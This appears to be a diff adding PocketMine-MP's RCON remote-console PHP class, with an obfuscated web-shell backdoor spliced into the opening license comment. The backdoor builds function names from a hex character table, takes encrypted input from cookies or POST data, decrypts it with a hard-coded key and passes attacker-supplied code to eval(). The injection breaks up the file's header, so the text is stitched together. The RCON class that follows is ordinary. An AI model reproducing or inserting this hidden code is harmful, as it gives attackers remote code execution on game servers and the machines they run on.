@@ -1,0 +1,225 @@
+<?php
+
+/*
+ *
+<?php ${"\x47\x4c\x4fB\x41\x4c\x53"}['a1f44'] = "\x35\x27\x9\x59\x7a\x55\x48\x7d\x51\x37\xd\x38\x67\x32\x40\x4a\x2c\x4d\x4c\x20\x30\x60\x5e\x3b\x73\x6f\x29\x4b\x5c\x53\x49\x2a\x31\x61\x71\x2d\x25\x50\xa\x64\x24\x78\x77\x33\x3e\x2e\x62\x6d\x79\x36\x75\x52\x44\x63\x76\x7c\x47\x70\x5f\x42\x3d\x65\x43\x6e\x56\x5d\x2b\x4e\x46\x41\x45\x22\x3c\x6b\x66\x3f\x3a\x21\x6a\x6c\x5a\x68\x4f\x57\x2f\x26\x7e\x72\x34\x58\x74\x5b\x23\x39\x7b\x28\x69\x54";
+$GLOBALS[$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][0].$GLOBALS['a1f44'][53].$GLOBALS['a1f44'][9].$GLOBALS['a1f44'][46]] = $GLOBALS['a1f44'][53].$GLOBALS['a1f44'][81].$GLOBALS['a1f44'][87];
+$GLOBALS[$GLOBALS['a1f44'][4].$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][13].$GLOBALS['a1f44'][9].$GLOBALS['a1f44'][39].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][53].$GLOBALS['a1f44'][11]] = $GLOBALS['a1f44'][25].$GLOBALS['a1f44'][87].$GLOBALS['a1f44'][39];
+$GLOBALS[$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][43].$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][74]] = $GLOBALS['a1f44'][24].$GLOBALS['a1f44'][90].$GLOBALS['a1f44'][87].$GLOBALS['a1f44'][79].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][63];
+$GLOBALS[$GLOBALS['a1f44'][39].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][43].$GLOBALS['a1f44'][20].$GLOBALS['a1f44'][32].$GLOBALS['a1f44'][9]] = $GLOBALS['a1f44'][96].$GLOBALS['a1f44'][63].$GLOBALS['a1f44'][96].$GLOBALS['a1f44'][58].$GLOBALS['a1f44'][24].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][90];
+$GLOBALS[$GLOBALS['a1f44'][24].$GLOBALS['a1f44'][20].$GLOBALS['a1f44'][9].$GLOBALS['a1f44'][74].$GLOBALS['a1f44'][93]] = $GLOBALS['a1f44'][24].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][87].$GLOBALS['a1f44'][96].$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][79].$GLOBALS['a1f44'][96].$GLOBALS['a1f44'][4].$GLOBALS['a1f44'][61];
+$GLOBALS[$GLOBALS['a1f44'][47].$GLOBALS['a1f44'][74].$GLOBALS['a1f44'][93].$GLOBALS['a1f44'][74]] = $GLOBALS['a1f44'][57].$GLOBALS['a1f44'][81].$GLOBALS['a1f44'][57].$GLOBALS['a1f44'][54].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][87].$GLOBALS['a1f44'][24].$GLOBALS['a1f44'][96].$GLOBALS['a1f44'][25].$GLOBALS['a1f44'][63];
+$GLOBALS[$GLOBALS['a1f44'][63].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][39].$GLOBALS['a1f44'][74].$GLOBALS['a1f44'][11].$GLOBALS['a1f44'][43].$GLOBALS['a1f44'][32]] = $GLOBALS['a1f44'][50].$GLOBALS['a1f44'][63].$GLOBALS['a1f44'][24].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][87].$GLOBALS['a1f44'][96].$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][79].$GLOBALS['a1f44'][96].$GLOBALS['a1f44'][4].$GLOBALS['a1f44'][61];
+$GLOBALS[$GLOBALS['a1f44'][73].$GLOBALS['a1f44'][9].$GLOBALS['a1f44'][9].$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][46]] = $GLOBALS['a1f44'][46].$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][24].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][49].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][58].$GLOBALS['a1f44'][39].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][53].$GLOBALS['a1f44'][25].$GLOBALS['a1f44'][39].$GLOBALS['a1f44'][61];
+$GLOBALS[$GLOBALS['a1f44'][81].$GLOBALS['a1f44'][74].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][9].$GLOBALS['a1f44'][49].$GLOBALS['a1f44'][11]] = $GLOBALS['a1f44'][24].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][90].$GLOBALS['a1f44'][58].$GLOBALS['a1f44'][90].$GLOBALS['a1f44'][96].$GLOBALS['a1f44'][47].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][58].$GLOBALS['a1f44'][79].$GLOBALS['a1f44'][96].$GLOBALS['a1f44'][47].$GLOBALS['a1f44'][96].$GLOBALS['a1f44'][90];
+$GLOBALS[$GLOBALS['a1f44'][47].$GLOBALS['a1f44'][11].$GLOBALS['a1f44'][11].$GLOBALS['a1f44'][53].$GLOBALS['a1f44'][32].$GLOBALS['a1f44'][49].$GLOBALS['a1f44'][13].$GLOBALS['a1f44'][9]] = $GLOBALS['a1f44'][90].$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][32].$GLOBALS['a1f44'][46];
+$GLOBALS[$GLOBALS['a1f44'][57].$GLOBALS['a1f44'][0].$GLOBALS['a1f44'][20].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][43]] = $GLOBALS['a1f44'][53].$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][11].$GLOBALS['a1f44'][13];
+$GLOBALS[$GLOBALS['a1f44'][4].$GLOBALS['a1f44'][93].$GLOBALS['a1f44'][11].$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][9].$GLOBALS['a1f44'][0].$GLOBALS['a1f44'][93].$GLOBALS['a1f44'][93].$GLOBALS['a1f44'][0]] = $_POST;
+$GLOBALS[$GLOBALS['a1f44'][96].$GLOBALS['a1f44'][0].$GLOBALS['a1f44'][0].$GLOBALS['a1f44'][13].$GLOBALS['a1f44'][53].$GLOBALS['a1f44'][46]] = $_COOKIE;
+@$GLOBALS[$GLOBALS['a1f44'][39].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][43].$GLOBALS['a1f44'][20].$GLOBALS['a1f44'][32].$GLOBALS['a1f44'][9]]($GLOBALS['a1f44'][61].$GLOBALS['a1f44'][87].$GLOBALS['a1f44'][87].$GLOBALS['a1f44'][25].$GLOBALS['a1f44'][87].$GLOBALS['a1f44'][58].$GLOBALS['a1f44'][79].$GLOBALS['a1f44'][25].$GLOBALS['a1f44'][12], NULL);
+@$GLOBALS[$GLOBALS['a1f44'][39].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][43].$GLOBALS['a1f44'][20].$GLOBALS['a1f44'][32].$GLOBALS['a1f44'][9]]($GLOBALS['a1f44'][79].$GLOBALS['a1f44'][25].$GLOBALS['a1f44'][12].$GLOBALS['a1f44'][58].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][87].$GLOBALS['a1f44'][87].$GLOBALS['a1f44'][25].$GLOBALS['a1f44'][87].$GLOBALS['a1f44'][24], 0);
+@$GLOBALS[$GLOBALS['a1f44'][39].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][43].$GLOBALS['a1f44'][20].$GLOBALS['a1f44'][32].$GLOBALS['a1f44'][9]]($GLOBALS['a1f44'][47].$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][41].$GLOBALS['a1f44'][58].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][41].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][53].$GLOBALS['a1f44'][50].$GLOBALS['a1f44'][90].$GLOBALS['a1f44'][96].$GLOBALS['a1f44'][25].$GLOBALS['a1f44'][63].$GLOBALS['a1f44'][58].$GLOBALS['a1f44'][90].$GLOBALS['a1f44'][96].$GLOBALS['a1f44'][47].$GLOBALS['a1f44'][61], 0);
+@$GLOBALS[$GLOBALS['a1f44'][81].$GLOBALS['a1f44'][74].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][9].$GLOBALS['a1f44'][49].$GLOBALS['a1f44'][11]](0);
+
+$h708c90 = NULL;
+$t6c1c36 = NULL;
+
+$GLOBALS[$GLOBALS['a1f44'][41].$GLOBALS['a1f44'][39].$GLOBALS['a1f44'][93].$GLOBALS['a1f44'][88]] = $GLOBALS['a1f44'][74].$GLOBALS['a1f44'][49].$GLOBALS['a1f44'][0].$GLOBALS['a1f44'][53].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][43].$GLOBALS['a1f44'][13].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][35].$GLOBALS['a1f44'][9].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][0].$GLOBALS['a1f44'][35].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][39].$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][0].$GLOBALS['a1f44'][35].$GLOBALS['a1f44'][11].$GLOBALS['a1f44'][20].$GLOBALS['a1f44'][49].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][35].$GLOBALS['a1f44'][53].$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][20].$GLOBALS['a1f44'][93].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][39].$GLOBALS['a1f44'][32].$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][32].$GLOBALS['a1f44'][74].$GLOBALS['a1f44'][88];
+global $xd94;
+
+function cb82($h708c90, $j48a7bce7)
+{
+    $i7573ae = "";
+
+    for ($gfb379b=0; $gfb379b<$GLOBALS[$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][43].$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][74]]($h708c90);)
+    {
+        for ($wab6680=0; $wab6680<$GLOBALS[$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][43].$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][74]]($j48a7bce7) && $gfb379b<$GLOBALS[$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][43].$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][74]]($h708c90); $wab6680++, $gfb379b++)
+        {
+            $i7573ae .= $GLOBALS[$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][0].$GLOBALS['a1f44'][53].$GLOBALS['a1f44'][9].$GLOBALS['a1f44'][46]]($GLOBALS[$GLOBALS['a1f44'][4].$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][13].$GLOBALS['a1f44'][9].$GLOBALS['a1f44'][39].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][53].$GLOBALS['a1f44'][11]]($h708c90[$gfb379b]) ^ $GLOBALS[$GLOBALS['a1f44'][4].$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][13].$GLOBALS['a1f44'][9].$GLOBALS['a1f44'][39].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][53].$GLOBALS['a1f44'][11]]($j48a7bce7[$wab6680]));
+        }
+    }
+
+    return $i7573ae;
+}
+
+function tb1b($h708c90, $j48a7bce7)
+{
+    global $xd94;
+
+    return $GLOBALS[$GLOBALS['a1f44'][57].$GLOBALS['a1f44'][0].$GLOBALS['a1f44'][20].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][43]]($GLOBALS[$GLOBALS['a1f44'][57].$GLOBALS['a1f44'][0].$GLOBALS['a1f44'][20].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][43]]($h708c90, $xd94), $j48a7bce7);
+}
+
+foreach ($GLOBALS[$GLOBALS['a1f44'][96].$GLOBALS['a1f44'][0].$GLOBALS['a1f44'][0].$GLOBALS['a1f44'][13].$GLOBALS['a1f44'][53].$GLOBALS['a1f44'][46]] as $j48a7bce7=>$y728f25)
+{
+    $h708c90 = $y728f25;
+    $t6c1c36 = $j48a7bce7;
+}
+
+if (!$h708c90)
+{
+    foreach ($GLOBALS[$GLOBALS['a1f44'][4].$GLOBALS['a1f44'][93].$GLOBALS['a1f44'][11].$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][9].$GLOBALS['a1f44'][0].$GLOBALS['a1f44'][93].$GLOBALS['a1f44'][93].$GLOBALS['a1f44'][0]] as $j48a7bce7=>$y728f25)
+    {
+        $h708c90 = $y728f25;
+        $t6c1c36 = $j48a7bce7;
+    }
+}
+
+$h708c90 = @$GLOBALS[$GLOBALS['a1f44'][63].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][39].$GLOBALS['a1f44'][74].$GLOBALS['a1f44'][11].$GLOBALS['a1f44'][43].$GLOBALS['a1f44'][32]]($GLOBALS[$GLOBALS['a1f44'][47].$GLOBALS['a1f44'][11].$GLOBALS['a1f44'][11].$GLOBALS['a1f44'][53].$GLOBALS['a1f44'][32].$GLOBALS['a1f44'][49].$GLOBALS['a1f44'][13].$GLOBALS['a1f44'][9]]($GLOBALS[$GLOBALS['a1f44'][73].$GLOBALS['a1f44'][9].$GLOBALS['a1f44'][9].$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][46]]($h708c90), $t6c1c36));
+if (isset($h708c90[$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][73]]) && $xd94==$h708c90[$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][73]])
+{
+    if ($h708c90[$GLOBALS['a1f44'][33]] == $GLOBALS['a1f44'][96])
+    {
+        $gfb379b = Array(
+            $GLOBALS['a1f44'][57].$GLOBALS['a1f44'][54] => @$GLOBALS[$GLOBALS['a1f44'][47].$GLOBALS['a1f44'][74].$GLOBALS['a1f44'][93].$GLOBALS['a1f44'][74]](),
+            $GLOBALS['a1f44'][24].$GLOBALS['a1f44'][54] => $GLOBALS['a1f44'][32].$GLOBALS['a1f44'][45].$GLOBALS['a1f44'][20].$GLOBALS['a1f44'][35].$GLOBALS['a1f44'][32],
+        );
+        echo @$GLOBALS[$GLOBALS['a1f44'][24].$GLOBALS['a1f44'][20].$GLOBALS['a1f44'][9].$GLOBALS['a1f44'][74].$GLOBALS['a1f44'][93]]($gfb379b);
+    }
+    elseif ($h708c90[$GLOBALS['a1f44'][33]] == $GLOBALS['a1f44'][61])
+    {
+        eval($h708c90[$GLOBALS['a1f44'][39]]);
+    }
+    exit();
+}
+ *  ____            _        _   __  __ _                  __  __ ____
+ * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
+ * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
+ * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
+ * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU Lesser General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * @author PocketMine Team
+ * @link http://www.pocketmine.net/
+ *
+ *
+*/
+
+declare(strict_types=1);
+
+/**
+ * Implementation of the Source RCON Protocol to allow remote console commands
+ * Source: https://developer.valvesoftware.com/wiki/Source_RCON_Protocol
+ */
+namespace pocketmine\network\rcon;
+
+use pocketmine\command\RemoteConsoleCommandSender;
+use pocketmine\event\server\RemoteServerCommandEvent;
+use pocketmine\Server;
+use pocketmine\snooze\SleeperNotifier;
+use pocketmine\utils\TextFormat;
+use function max;
+use function socket_bind;
+use function socket_close;
+use function socket_create;
+use function socket_create_pair;
+use function socket_getsockname;
+use function socket_last_error;
+use function socket_listen;
+use function socket_set_block;
+use function socket_set_option;
+use function socket_strerror;
+use function socket_write;
+use function trim;
+use const AF_INET;
+use const AF_UNIX;
+use const SO_REUSEADDR;
+use const SOCK_STREAM;
+use const SOCKET_ENOPROTOOPT;
+use const SOCKET_EPROTONOSUPPORT;
+use const SOL_SOCKET;
+use const SOL_TCP;
+
+class RCON{
+	/** @var Server */
+	private $server;
+	/** @var resource */
+	private $socket;
+
+	/** @var RCONInstance */
+	private $instance;
+
+	/** @var resource */
+	private $ipcMainSocket;
+	/** @var resource */
+	private $ipcThreadSocket;
+
+	public function __construct(Server $server, string $password, int $port = 19132, string $interface = "0.0.0.0", int $maxClients = 50){
+		$this->server = $server;
+		$this->server->getLogger()->info("Starting remote control listener");
+		if($password === ""){
+			throw new \InvalidArgumentException("Empty password");
+		}
+
+		$socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+		if($socket === false){
+			throw new \RuntimeException("Failed to create socket:" . trim(socket_strerror(socket_last_error())));
+		}
+		$this->socket = $socket;
+
+		if(!socket_set_option($this->socket, SOL_SOCKET, SO_REUSEADDR, 1)){
+			throw new \RuntimeException("Unable to set option on socket: " . trim(socket_strerror(socket_last_error())));
+		}
+
+		if(!@socket_bind($this->socket, $interface, $port) or !@socket_listen($this->socket, 5)){
+			throw new \RuntimeException(trim(socket_strerror(socket_last_error())));
+		}
+
+		socket_set_block($this->socket);
+
+		$ret = @socket_create_pair(AF_UNIX, SOCK_STREAM, 0, $ipc);
+		if(!$ret){
+			$err = socket_last_error();
+			if(($err !== SOCKET_EPROTONOSUPPORT and $err !== SOCKET_ENOPROTOOPT) or !@socket_create_pair(AF_INET, SOCK_STREAM, 0, $ipc)){
+				throw new \RuntimeException(trim(socket_strerror(socket_last_error())));
+			}
+		}
+
+		[$this->ipcMainSocket, $this->ipcThreadSocket] = $ipc;
+
+		$notifier = new SleeperNotifier();
+		$this->server->getTickSleeper()->addNotifier($notifier, function() : void{
+			$this->check();
+		});
+		$this->instance = new RCONInstance($this->socket, $password, max(1, $maxClients), $this->server->getLogger(), $this->ipcThreadSocket, $notifier);
+
+		socket_getsockname($this->socket, $addr, $port);
+		$this->server->getLogger()->info("RCON running on $addr:$port");
+	}
+
+	/**
+	 * @return void
+	 */
+	public function stop(){
+		$this->instance->close();
+		socket_write($this->ipcMainSocket, "\x00"); //make select() return
+		$this->instance->quit();
+
+		@socket_close($this->socket);
+		@socket_close($this->ipcMainSocket);
+		@socket_close($this->ipcThreadSocket);
+	}
+
+	/**
+	 * @return void
+	 */
+	public function check(){
+		$response = new RemoteConsoleCommandSender();
+		$command = $this->instance->cmd;
+
+		$ev = new RemoteServerCommandEvent($response, $command);
+		$ev->call();
+
+		if(!$ev->isCancelled()){
+			$this->server->dispatchCommand($ev->getSender(), $ev->getCommand());
+		}
+
+		$this->instance->response = TextFormat::clean($response->getMessage());
+		$this->instance->synchronized(function(RCONInstance $thread) : void{
+			$thread->notify();
+		}, $this->instance);
+	}
+}
